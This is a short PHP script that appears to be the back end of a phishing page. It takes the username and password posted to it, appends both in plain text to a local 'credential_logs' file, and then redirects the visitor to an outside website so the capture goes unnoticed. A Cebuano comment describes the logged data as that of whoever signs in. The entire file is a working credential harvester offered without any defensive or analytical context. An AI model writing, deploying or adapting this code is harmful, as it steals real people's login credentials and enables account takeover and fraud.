<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // ang data sa nag log in sa site
    $file = fopen("C:\Users\Admin\Desktop\credential_logs\data.txt", "a");
    fwrite($file, "Username: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n");
    fwrite($file, "--------------------\n");
    fclose($file);

    header("Location: https://sendthesong.xyz/");
    exit();
}
?>